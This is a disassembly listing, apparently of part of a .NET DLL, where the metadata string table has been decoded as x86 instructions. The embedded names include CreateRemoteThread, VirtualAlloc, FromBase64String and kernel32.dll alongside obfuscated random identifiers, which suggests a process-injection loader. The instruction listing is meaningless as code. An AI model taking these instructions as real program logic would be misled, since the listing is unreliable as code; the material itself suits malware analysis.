100030ea:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100030ef:	6e                   	outsb  %ds:(%esi),(%dx)
100030f0:	73 2e                	jae    0x10003120
100030f2:	47                   	inc    %edi
100030f3:	65 6e                	outsb  %gs:(%esi),(%dx)
100030f5:	65 72 69             	gs jb  0x10003161
100030f8:	63 00                	arpl   %eax,(%eax)
100030fa:	41                   	inc    %ecx
100030fb:	69 56 49 70 49 54 70 	imul   $0x70544970,0x49(%esi),%edx
10003102:	68 49 6e 32 62       	push   $0x62326e49
10003107:	39 6b 6c             	cmp    %ebp,0x6c(%ebx)
1000310a:	4f                   	dec    %edi
1000310b:	30 7a 51             	xor    %bh,0x51(%edx)
1000310e:	56                   	push   %esi
1000310f:	38 78 6e             	cmp    %bh,0x6e(%eax)
10003112:	63 00                	arpl   %eax,(%eax)
10003114:	47                   	inc    %edi
10003115:	65 74 50             	gs je  0x10003168
10003118:	72 6f                	jb     0x10003189
1000311a:	63 65 73             	arpl   %esp,0x73(%ebp)
1000311d:	73 42                	jae    0x10003161
1000311f:	79 49                	jns    0x1000316a
10003121:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10003125:	74 45                	je     0x1000316c
10003127:	78 69                	js     0x10003192
10003129:	74 43                	je     0x1000316e
1000312b:	6f                   	outsl  %ds:(%esi),(%dx)
1000312c:	64 65 54             	fs gs push %esp
1000312f:	68 72 65 61 64       	push   $0x64616572
10003134:	00 43 72             	add    %al,0x72(%ebx)
10003137:	65 61                	gs popa
10003139:	74 65                	je     0x100031a0
1000313b:	52                   	push   %edx
1000313c:	65 6d                	gs insl (%dx),%es:(%edi)
1000313e:	6f                   	outsl  %ds:(%esi),(%dx)
1000313f:	74 65                	je     0x100031a6
10003141:	54                   	push   %esp
10003142:	68 72 65 61 64       	push   $0x64616572
10003147:	00 41 64             	add    %al,0x64(%ecx)
1000314a:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
1000314e:	74 5f                	je     0x100031af
10003150:	48                   	dec    %eax
10003151:	61                   	popa
10003152:	73 45                	jae    0x10003199
10003154:	78 69                	js     0x100031bf
10003156:	74 65                	je     0x100031bd
10003158:	64 00 43 6d          	add    %al,%fs:0x6d(%ebx)
1000315c:	47                   	inc    %edi
1000315d:	64 6a 7a             	fs push $0x7a
10003160:	75 33                	jne    0x10003195
10003162:	74 54                	je     0x100031b8
10003164:	6a 72                	push   $0x72
10003166:	41                   	inc    %ecx
10003167:	32 76 36             	xor    0x36(%esi),%dh
1000316a:	6c                   	insb   (%dx),%es:(%edi)
1000316b:	58                   	pop    %eax
1000316c:	4c                   	dec    %esp
1000316d:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
10003171:	70 6c                	jo     0x100031df
10003173:	61                   	popa
10003174:	63 65 00             	arpl   %esp,0x0(%ebp)
10003177:	45                   	inc    %ebp
10003178:	6e                   	outsb  %ds:(%esi),(%dx)
10003179:	75 6d                	jne    0x100031e8
1000317b:	65 72 61             	gs jb  0x100031df
1000317e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10003182:	43                   	inc    %ebx
10003183:	6c                   	insb   (%dx),%es:(%edi)
10003184:	6f                   	outsl  %ds:(%esi),(%dx)
10003185:	73 65                	jae    0x100031ec
10003187:	48                   	dec    %eax
10003188:	61                   	popa
10003189:	6e                   	outsb  %ds:(%esi),(%dx)
1000318a:	64 6c                	fs insb (%dx),%es:(%edi)
1000318c:	65 00 46 69          	add    %al,%gs:0x69(%esi)
10003190:	6c                   	insb   (%dx),%es:(%edi)
10003191:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10003195:	6c                   	insb   (%dx),%es:(%edi)
10003196:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
1000319a:	6d                   	insl   (%dx),%es:(%edi)
1000319b:	62 69 6e             	bound  %ebp,0x6e(%ecx)
1000319e:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
100031a2:	6c                   	insb   (%dx),%es:(%edi)
100031a3:	75 65                	jne    0x1000320a
100031a5:	54                   	push   %esp
100031a6:	79 70                	jns    0x10003218
100031a8:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
100031ac:	65 72 65             	gs jb  0x10003214
100031af:	00 53 79             	add    %dl,0x79(%ebx)
100031b2:	73 74                	jae    0x10003228
100031b4:	65 6d                	gs insl (%dx),%es:(%edi)
100031b6:	2e 43                	cs inc %ebx
100031b8:	6f                   	outsl  %ds:(%esi),(%dx)
100031b9:	72 65                	jb     0x10003220
100031bb:	00 43 6f             	add    %al,0x6f(%ebx)
100031be:	6d                   	insl   (%dx),%es:(%edi)
100031bf:	70 69                	jo     0x1000322a
100031c1:	6c                   	insb   (%dx),%es:(%edi)
100031c2:	65 72 47             	gs jb  0x1000320c
100031c5:	65 6e                	outsb  %gs:(%esi),(%dx)
100031c7:	65 72 61             	gs jb  0x1000322b
100031ca:	74 65                	je     0x10003231
100031cc:	64 41                	fs inc %ecx
100031ce:	74 74                	je     0x10003244
100031d0:	72 69                	jb     0x1000323b
100031d2:	62 75 74             	bound  %esi,0x74(%ebp)
100031d5:	65 00 47 75          	add    %al,%gs:0x75(%edi)
100031d9:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
100031e0:	62 
100031e1:	75 74                	jne    0x10003257
100031e3:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
100031e8:	75 67                	jne    0x10003251
100031ea:	67 61                	addr16 popa
100031ec:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
100031f0:	74 74                	je     0x10003266
100031f2:	72 69                	jb     0x1000325d
100031f4:	62 75 74             	bound  %esi,0x74(%ebp)
100031f7:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
100031fb:	6d                   	insl   (%dx),%es:(%edi)
100031fc:	56                   	push   %esi
100031fd:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10003204:	74 74                	je     0x1000327a
10003206:	72 69                	jb     0x10003271
10003208:	62 75 74             	bound  %esi,0x74(%ebp)
1000320b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000320f:	73 65                	jae    0x10003276
10003211:	6d                   	insl   (%dx),%es:(%edi)
10003212:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10003216:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
1000321d:	72 
1000321e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10003225:	73 73                	jae    0x1000329a
10003227:	65 6d                	gs insl (%dx),%es:(%edi)
10003229:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
1000322d:	72 61                	jb     0x10003290
1000322f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10003232:	61                   	popa
10003233:	72 6b                	jb     0x100032a0
10003235:	41                   	inc    %ecx
10003236:	74 74                	je     0x100032ac
10003238:	72 69                	jb     0x100032a3
1000323a:	62 75 74             	bound  %esi,0x74(%ebp)
1000323d:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10003242:	67 65 74 46          	addr16 gs je 0x1000328c
10003246:	72 61                	jb     0x100032a9
10003248:	6d                   	insl   (%dx),%es:(%edi)
10003249:	65 77 6f             	gs ja  0x100032bb
1000324c:	72 6b                	jb     0x100032b9
1000324e:	41                   	inc    %ecx
1000324f:	74 74                	je     0x100032c5
10003251:	72 69                	jb     0x100032bc
10003253:	62 75 74             	bound  %esi,0x74(%ebp)
10003256:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000325a:	73 65                	jae    0x100032c1
1000325c:	6d                   	insl   (%dx),%es:(%edi)
1000325d:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10003261:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10003268:	69 
10003269:	6f                   	outsl  %ds:(%esi),(%dx)
1000326a:	6e                   	outsb  %ds:(%esi),(%dx)
1000326b:	41                   	inc    %ecx
1000326c:	74 74                	je     0x100032e2
1000326e:	72 69                	jb     0x100032d9
10003270:	62 75 74             	bound  %esi,0x74(%ebp)
10003273:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003277:	73 65                	jae    0x100032de
10003279:	6d                   	insl   (%dx),%es:(%edi)
1000327a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000327e:	6f                   	outsl  %ds:(%esi),(%dx)
1000327f:	6e                   	outsb  %ds:(%esi),(%dx)
10003280:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10003286:	74 69                	je     0x100032f1
10003288:	6f                   	outsl  %ds:(%esi),(%dx)
10003289:	6e                   	outsb  %ds:(%esi),(%dx)
1000328a:	41                   	inc    %ecx
1000328b:	74 74                	je     0x10003301
1000328d:	72 69                	jb     0x100032f8
1000328f:	62 75 74             	bound  %esi,0x74(%ebp)
10003292:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003296:	73 65                	jae    0x100032fd
10003298:	6d                   	insl   (%dx),%es:(%edi)
10003299:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
1000329d:	65 73 63             	gs jae 0x10003303
100032a0:	72 69                	jb     0x1000330b
100032a2:	70 74                	jo     0x10003318
100032a4:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
100032ab:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
100032b2:	6f                   	outsl  %ds:(%esi),(%dx)
100032b3:	6d                   	insl   (%dx),%es:(%edi)
100032b4:	70 69                	jo     0x1000331f
100032b6:	6c                   	insb   (%dx),%es:(%edi)
100032b7:	61                   	popa
100032b8:	74 69                	je     0x10003323
100032ba:	6f                   	outsl  %ds:(%esi),(%dx)
100032bb:	6e                   	outsb  %ds:(%esi),(%dx)
100032bc:	52                   	push   %edx
100032bd:	65 6c                	gs insb (%dx),%es:(%edi)
100032bf:	61                   	popa
100032c0:	78 61                	js     0x10003323
100032c2:	74 69                	je     0x1000332d
100032c4:	6f                   	outsl  %ds:(%esi),(%dx)
100032c5:	6e                   	outsb  %ds:(%esi),(%dx)
100032c6:	73 41                	jae    0x10003309
100032c8:	74 74                	je     0x1000333e
100032ca:	72 69                	jb     0x10003335
100032cc:	62 75 74             	bound  %esi,0x74(%ebp)
100032cf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100032d3:	73 65                	jae    0x1000333a
100032d5:	6d                   	insl   (%dx),%es:(%edi)
100032d6:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
100032da:	72 6f                	jb     0x1000334b
100032dc:	64 75 63             	fs jne 0x10003342
100032df:	74 41                	je     0x10003322
100032e1:	74 74                	je     0x10003357
100032e3:	72 69                	jb     0x1000334e
100032e5:	62 75 74             	bound  %esi,0x74(%ebp)
100032e8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100032ec:	73 65                	jae    0x10003353
100032ee:	6d                   	insl   (%dx),%es:(%edi)
100032ef:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
100032f3:	6f                   	outsl  %ds:(%esi),(%dx)
100032f4:	70 79                	jo     0x1000336f
100032f6:	72 69                	jb     0x10003361
100032f8:	67 68 74 41 74 74    	addr16 push $0x74744174
100032fe:	72 69                	jb     0x10003369
10003300:	62 75 74             	bound  %esi,0x74(%ebp)
10003303:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003307:	73 65                	jae    0x1000336e
10003309:	6d                   	insl   (%dx),%es:(%edi)
1000330a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000330e:	6f                   	outsl  %ds:(%esi),(%dx)
1000330f:	6d                   	insl   (%dx),%es:(%edi)
10003310:	70 61                	jo     0x10003373
10003312:	6e                   	outsb  %ds:(%esi),(%dx)
10003313:	79 41                	jns    0x10003356
10003315:	74 74                	je     0x1000338b
10003317:	72 69                	jb     0x10003382
10003319:	62 75 74             	bound  %esi,0x74(%ebp)
1000331c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10003320:	6e                   	outsb  %ds:(%esi),(%dx)
10003321:	74 69                	je     0x1000338c
10003323:	6d                   	insl   (%dx),%es:(%edi)
10003324:	65 43                	gs inc %ebx
10003326:	6f                   	outsl  %ds:(%esi),(%dx)
10003327:	6d                   	insl   (%dx),%es:(%edi)
10003328:	70 61                	jo     0x1000338b
1000332a:	74 69                	je     0x10003395
1000332c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
1000332f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10003336:	69 
10003337:	62 75 74             	bound  %esi,0x74(%ebp)
1000333a:	65 00 44 78 42       	add    %al,%gs:0x42(%eax,%edi,2)
1000333f:	79 6e                	jns    0x100033af
10003341:	68 62 35 67 75       	push   $0x75673562
10003346:	73 43                	jae    0x1000338b
10003348:	38 30                	cmp    %dh,(%eax)
1000334a:	4a                   	dec    %edx
1000334b:	33 4b 66             	xor    0x66(%ebx),%ecx
1000334e:	00 53 69             	add    %dl,0x69(%ebx)
10003351:	7a 65                	jp     0x100033b8
10003353:	4f                   	dec    %edi
10003354:	66 00 52 62          	data16 add %dl,0x62(%edx)
10003358:	6f                   	outsl  %ds:(%esi),(%dx)
10003359:	51                   	push   %ecx
1000335a:	45                   	inc    %ebp
1000335b:	4a                   	dec    %edx
1000335c:	35 36 62 73 6e       	xor    $0x6e736236,%eax
10003361:	57                   	push   %edi
10003362:	73 5a                	jae    0x100033be
10003364:	53                   	push   %ebx
10003365:	54                   	push   %esp
10003366:	4f                   	dec    %edi
10003367:	7a 31                	jp     0x1000339a
10003369:	6b 30 58             	imul   $0x58,(%eax),%esi
1000336c:	42                   	inc    %edx
1000336d:	5a                   	pop    %edx
1000336e:	66 00 53 79          	data16 add %dl,0x79(%ebx)
10003372:	73 74                	jae    0x100033e8
10003374:	65 6d                	gs insl (%dx),%es:(%edi)
10003376:	2e 54                	cs push %esp
10003378:	68 72 65 61 64       	push   $0x64616572
1000337d:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10003384:	6f                   	outsl  %ds:(%esi),(%dx)
10003385:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
1000338c:	73 
1000338d:	74 65                	je     0x100033f4
1000338f:	6d                   	insl   (%dx),%es:(%edi)
10003390:	2e 52                	cs push %edx
10003392:	75 6e                	jne    0x10003402
10003394:	74 69                	je     0x100033ff
10003396:	6d                   	insl   (%dx),%es:(%edi)
10003397:	65 2e 56             	gs cs push %esi
1000339a:	65 72 73             	gs jb  0x10003410
1000339d:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
100033a4:	46                   	inc    %esi
100033a5:	72 6f                	jb     0x10003416
100033a7:	6d                   	insl   (%dx),%es:(%edi)
100033a8:	42                   	inc    %edx
100033a9:	61                   	popa
100033aa:	73 65                	jae    0x10003411
100033ac:	36 34 53             	ss xor $0x53,%al
100033af:	74 72                	je     0x10003423
100033b1:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
100033b8:	53                   	push   %ebx
100033b9:	74 72                	je     0x1000342d
100033bb:	69 6e 67 00 50 61 74 	imul   $0x74615000,0x67(%esi),%ebp
100033c2:	68 00 67 65 74       	push   $0x74656700
100033c7:	5f                   	pop    %edi
100033c8:	4c                   	dec    %esp
100033c9:	65 6e                	outsb  %gs:(%esi),(%dx)
100033cb:	67 74 68             	addr16 je 0x10003436
100033ce:	00 4b 52             	add    %cl,0x52(%ebx)
100033d1:	71 62                	jno    0x10003435
100033d3:	71 51                	jno    0x10003426
100033d5:	31 34 47             	xor    %esi,(%edi,%eax,2)
100033d8:	77 38                	ja     0x10003412
100033da:	6a 6d                	push   $0x6d
100033dc:	6b 76 6b 75          	imul   $0x75,0x6b(%esi),%esi
100033e0:	77 37                	ja     0x10003419
100033e2:	6a 00                	push   $0x0
100033e4:	55                   	push   %ebp
100033e5:	61                   	popa
100033e6:	4c                   	dec    %esp
100033e7:	63 51 7a             	arpl   %edx,0x7a(%ecx)
100033ea:	78 6d                	js     0x10003459
100033ec:	6e                   	outsb  %ds:(%esi),(%dx)
100033ed:	4e                   	dec    %esi
100033ee:	67 55                	addr16 push %ebp
100033f0:	59                   	pop    %ecx
100033f1:	6b 00 4d             	imul   $0x4d,(%eax),%eax
100033f4:	61                   	popa
100033f5:	72 73                	jb     0x1000346a
100033f7:	68 61 6c 00 6b       	push   $0x6b006c61
100033fc:	65 72 6e             	gs jb  0x1000346d
100033ff:	65 6c                	gs insb (%dx),%es:(%edi)
10003401:	33 32                	xor    (%edx),%esi
10003403:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10003406:	6c                   	insb   (%dx),%es:(%edi)
10003407:	00 57 6c             	add    %dl,0x6c(%edi)
1000340a:	5a                   	pop    %edx
1000340b:	52                   	push   %edx
1000340c:	58                   	pop    %eax
1000340d:	65 65 79 76          	gs gs jns 0x10003487
10003411:	56                   	push   %esi
10003412:	65 76 44             	gs jbe 0x10003459
10003415:	54                   	push   %esp
10003416:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
10003419:	6c                   	insb   (%dx),%es:(%edi)
1000341a:	00 4b 69             	add    %cl,0x69(%ebx)
1000341d:	6c                   	insb   (%dx),%es:(%edi)
1000341e:	6c                   	insb   (%dx),%es:(%edi)
1000341f:	00 44 6c 4d          	add    %al,0x4d(%esp,%ebp,2)
10003423:	4e                   	dec    %esi
10003424:	58                   	pop    %eax
10003425:	6d                   	insl   (%dx),%es:(%edi)
10003426:	65 59                	gs pop %ecx
10003428:	6e                   	outsb  %ds:(%esi),(%dx)
10003429:	74 71                	je     0x1000349c
1000342b:	4f                   	dec    %edi
1000342c:	6e                   	outsb  %ds:(%esi),(%dx)
1000342d:	69 42 6d 00 59 43 43 	imul   $0x43435900,0x6d(%edx),%eax
10003434:	6e                   	outsb  %ds:(%esi),(%dx)
10003435:	49                   	dec    %ecx
10003436:	6b 4c 62 46 51       	imul   $0x51,0x46(%edx,%eiz,2),%ecx
1000343b:	66 73 32             	data16 jae 0x10003470
1000343e:	4d                   	dec    %ebp
1000343f:	49                   	dec    %ecx
10003440:	6d                   	insl   (%dx),%es:(%edi)
10003441:	00 53 79             	add    %dl,0x79(%ebx)
10003444:	73 74                	jae    0x100034ba
10003446:	65 6d                	gs insl (%dx),%es:(%edi)
10003448:	00 52 61             	add    %dl,0x61(%edx)
1000344b:	6e                   	outsb  %ds:(%esi),(%dx)
1000344c:	64 6f                	outsl  %fs:(%esi),(%dx)
1000344e:	6d                   	insl   (%dx),%es:(%edi)
1000344f:	00 47 65             	add    %al,0x65(%edi)
10003452:	74 46                	je     0x1000349a
10003454:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
1000345b:	57 
1000345c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
10003463:	78 
10003464:	74 65                	je     0x100034cb
10003466:	6e                   	outsb  %ds:(%esi),(%dx)
10003467:	73 69                	jae    0x100034d2
10003469:	6f                   	outsl  %ds:(%esi),(%dx)
1000346a:	6e                   	outsb  %ds:(%esi),(%dx)
1000346b:	00 53 79             	add    %dl,0x79(%ebx)
1000346e:	73 74                	jae    0x100034e4
10003470:	65 6d                	gs insl (%dx),%es:(%edi)
10003472:	2e 52                	cs push %edx
10003474:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
10003477:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
1000347c:	6e                   	outsb  %ds:(%esi),(%dx)
1000347d:	00 53 65             	add    %dl,0x65(%ebx)
10003480:	61                   	popa
10003481:	72 63                	jb     0x100034e6
10003483:	68 4f 70 74 69       	push   $0x6974704f
10003488:	6f                   	outsl  %ds:(%esi),(%dx)
10003489:	6e                   	outsb  %ds:(%esi),(%dx)
1000348a:	00 45 78             	add    %al,0x78(%ebp)
1000348d:	63 65 70             	arpl   %esp,0x70(%ebp)
10003490:	74 69                	je     0x100034fb
10003492:	6f                   	outsl  %ds:(%esi),(%dx)
10003493:	6e                   	outsb  %ds:(%esi),(%dx)
10003494:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
10003498:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
1000349d:	79 49                	jns    0x100034e8
1000349f:	6e                   	outsb  %ds:(%esi),(%dx)
100034a0:	66 6f                	outsw  %ds:(%esi),(%dx)
100034a2:	00 5a 65             	add    %bl,0x65(%edx)
100034a5:	72 6f                	jb     0x10003516
100034a7:	00 53 6c             	add    %dl,0x6c(%ebx)
100034aa:	65 65 70 00          	gs gs jo 0x100034ae
100034ae:	54                   	push   %esp
100034af:	4c                   	dec    %esp
100034b0:	4d                   	dec    %ebp
100034b1:	4b                   	dec    %ebx
100034b2:	7a 41                	jp     0x100034f5
100034b4:	4e                   	dec    %esi
100034b5:	66 65 5a             	gs pop %dx
100034b8:	47                   	inc    %edi
100034b9:	6c                   	insb   (%dx),%es:(%edi)
100034ba:	61                   	popa
100034bb:	6d                   	insl   (%dx),%es:(%edi)
100034bc:	5a                   	pop    %edx
100034bd:	78 4d                	js     0x1000350c
100034bf:	38 32                	cmp    %dh,(%edx)
100034c1:	35 30 7a 4c 31       	xor    $0x314c7a30,%eax
100034c6:	71 00                	jno    0x100034c8
100034c8:	53                   	push   %ebx
100034c9:	79 73                	jns    0x1000353e
100034cb:	74 65                	je     0x10003532
100034cd:	6d                   	insl   (%dx),%es:(%edi)
100034ce:	2e 4c                	cs dec %esp
100034d0:	69 6e 71 00 4c 77 63 	imul   $0x63774c00,0x71(%esi),%ebp
100034d7:	4c                   	dec    %esp
100034d8:	53                   	push   %ebx
100034d9:	77 78                	ja     0x10003553
100034db:	65 4e                	gs dec %esi
100034dd:	71 75                	jno    0x10003554
100034df:	69 64 44 49 4d 55 37 	imul   $0x6237554d,0x49(%esp,%eax,2),%esp
100034e6:	62 
100034e7:	55                   	push   %ebp
100034e8:	4c                   	dec    %esp
100034e9:	72 71                	jb     0x1000355c
100034eb:	00 50 73             	add    %dl,0x73(%eax)
100034ee:	68 65 78 41 51       	push   $0x51417865
100034f3:	67 63 4e 44          	arpl   %ecx,0x44(%bp)
100034f7:	36 67 70 76          	ss addr16 jo 0x10003571
100034fb:	55                   	push   %ebp
100034fc:	5a                   	pop    %edx
100034fd:	4d                   	dec    %ebp
100034fe:	47                   	inc    %edi
100034ff:	72 00                	jb     0x10003501
10003501:	53                   	push   %ebx
10003502:	6d                   	insl   (%dx),%es:(%edi)
10003503:	61                   	popa
10003504:	7a 4e                	jp     0x10003554
10003506:	4d                   	dec    %ebp
10003507:	35 76 57 38 41       	xor    $0x41385776,%eax
1000350c:	63 30                	arpl   %esi,(%eax)
1000350e:	50                   	push   %eax
1000350f:	34 33                	xor    $0x33,%al
10003511:	37                   	aaa
10003512:	44                   	inc    %esp
10003513:	74 57                	je     0x1000356c
10003515:	44                   	inc    %esp
10003516:	6b 72 00 2e          	imul   $0x2e,0x0(%edx),%esi
1000351a:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
1000351e:	00 2e                	add    %ch,(%esi)
10003520:	63 63 74             	arpl   %esp,0x74(%ebx)
10003523:	6f                   	outsl  %ds:(%esi),(%dx)
10003524:	72 00                	jb     0x10003526
10003526:	49                   	dec    %ecx
10003527:	6e                   	outsb  %ds:(%esi),(%dx)
10003528:	74 50                	je     0x1000357a
1000352a:	74 72                	je     0x1000359e
1000352c:	00 53 79             	add    %dl,0x79(%ebx)
1000352f:	73 74                	jae    0x100035a5
10003531:	65 6d                	gs insl (%dx),%es:(%edi)
10003533:	2e 44                	cs inc %esp
10003535:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
1000353c:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10003543:	74 65                	je     0x100035aa
10003545:	6d                   	insl   (%dx),%es:(%edi)
10003546:	2e 52                	cs push %edx
10003548:	75 6e                	jne    0x100035b8
1000354a:	74 69                	je     0x100035b5
1000354c:	6d                   	insl   (%dx),%es:(%edi)
1000354d:	65 2e 49             	gs cs dec %ecx
10003550:	6e                   	outsb  %ds:(%esi),(%dx)
10003551:	74 65                	je     0x100035b8
10003553:	72 6f                	jb     0x100035c4
10003555:	70 53                	jo     0x100035aa
10003557:	65 72 76             	gs jb  0x100035d0
1000355a:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
10003561:	73 74                	jae    0x100035d7
10003563:	65 6d                	gs insl (%dx),%es:(%edi)
10003565:	2e 52                	cs push %edx
10003567:	75 6e                	jne    0x100035d7
10003569:	74 69                	je     0x100035d4
1000356b:	6d                   	insl   (%dx),%es:(%edi)
1000356c:	65 2e 43             	gs cs inc %ebx
1000356f:	6f                   	outsl  %ds:(%esi),(%dx)
10003570:	6d                   	insl   (%dx),%es:(%edi)
10003571:	70 69                	jo     0x100035dc
10003573:	6c                   	insb   (%dx),%es:(%edi)
10003574:	65 72 53             	gs jb  0x100035ca
10003577:	65 72 76             	gs jb  0x100035f0
1000357a:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
10003581:	62 75 67             	bound  %esi,0x67(%ebp)
10003584:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
1000358b:	65 
1000358c:	73 00                	jae    0x1000358e
1000358e:	47                   	inc    %edi
1000358f:	65 74 46             	gs je  0x100035d8
10003592:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
10003599:	6e 
1000359a:	74 61                	je     0x100035fd
1000359c:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
100035a3:	5f                   	pop    %edi
100035a4:	43                   	inc    %ebx
100035a5:	68 61 72 73 00       	push   $0x737261
100035aa:	43                   	inc    %ebx
100035ab:	72 65                	jb     0x10003612
100035ad:	61                   	popa
100035ae:	74 65                	je     0x10003615
100035b0:	50                   	push   %eax
100035b1:	72 6f                	jb     0x10003622
100035b3:	63 65 73             	arpl   %esp,0x73(%ebp)
100035b6:	73 00                	jae    0x100035b8
100035b8:	45                   	inc    %ebp
100035b9:	56                   	push   %esi
100035ba:	50                   	push   %eax
100035bb:	76 54                	jbe    0x10003611
100035bd:	50                   	push   %eax
100035be:	53                   	push   %ebx
100035bf:	47                   	inc    %edi
100035c0:	66 33 73 4e          	xor    0x4e(%ebx),%si
100035c4:	65 45                	gs inc %ebp
100035c6:	70 6b                	jo     0x10003633
100035c8:	49                   	dec    %ecx
100035c9:	46                   	inc    %esi
100035ca:	71 77                	jno    0x10003643
100035cc:	32 41 74             	xor    0x74(%ecx),%al
100035cf:	00 43 6f             	add    %al,0x6f(%ebx)
100035d2:	6e                   	outsb  %ds:(%esi),(%dx)
100035d3:	63 61 74             	arpl   %esp,0x74(%ecx)
100035d6:	00 52 65             	add    %dl,0x65(%edx)
100035d9:	70 65                	jo     0x10003640
100035db:	61                   	popa
100035dc:	74 00                	je     0x100035de
100035de:	4f                   	dec    %edi
100035df:	62 6a 65             	bound  %ebp,0x65(%edx)
100035e2:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
100035e6:	65 6c                	gs insb (%dx),%es:(%edi)
100035e8:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
100035ed:	6f                   	outsl  %ds:(%esi),(%dx)
100035ee:	6e                   	outsb  %ds:(%esi),(%dx)
100035ef:	76 65                	jbe    0x10003656
100035f1:	72 74                	jb     0x10003667
100035f3:	00 4e 65             	add    %cl,0x65(%esi)
100035f6:	78 74                	js     0x1000366c
100035f8:	00 53 79             	add    %dl,0x79(%ebx)
100035fb:	73 74                	jae    0x10003671
100035fd:	65 6d                	gs insl (%dx),%es:(%edi)
100035ff:	2e 54                	cs push %esp
10003601:	65 78 74             	gs js  0x10003678
10003604:	00 59 7a             	add    %bl,0x7a(%ecx)
10003607:	53                   	push   %ebx
10003608:	41                   	inc    %ecx
10003609:	69 64 35 66 4a 46 41 	imul   $0x5341464a,0x66(%ebp,%esi,1),%esp
10003610:	53 
10003611:	6d                   	insl   (%dx),%es:(%edi)
10003612:	42                   	inc    %edx
10003613:	75 00                	jne    0x10003615
10003615:	49                   	dec    %ecx
10003616:	56                   	push   %esi
10003617:	66 71 74             	data16 jno 0x1000368e
1000361a:	59                   	pop    %ecx
1000361b:	6f                   	outsl  %ds:(%esi),(%dx)
1000361c:	56                   	push   %esi
1000361d:	6f                   	outsl  %ds:(%esi),(%dx)
1000361e:	42                   	inc    %edx
1000361f:	58                   	pop    %eax
10003620:	77 55                	ja     0x10003677
10003622:	68 6a 70 30 66       	push   $0x6630706a
10003627:	76 00                	jbe    0x10003629
10003629:	5a                   	pop    %edx
1000362a:	46                   	inc    %esi
1000362b:	73 4b                	jae    0x10003678
1000362d:	7a 73                	jp     0x100036a2
1000362f:	34 6a                	xor    $0x6a,%al
10003631:	74 4f                	je     0x10003682
10003633:	4b                   	dec    %ebx
10003634:	73 4e                	jae    0x10003684
10003636:	63 41 41             	arpl   %eax,0x41(%ecx)
10003639:	50                   	push   %eax
1000363a:	43                   	inc    %ebx
1000363b:	73 79                	jae    0x100036b6
1000363d:	76 00                	jbe    0x1000363f
1000363f:	56                   	push   %esi
10003640:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
10003647:	6c                   	insb   (%dx),%es:(%edi)
10003648:	6c                   	insb   (%dx),%es:(%edi)
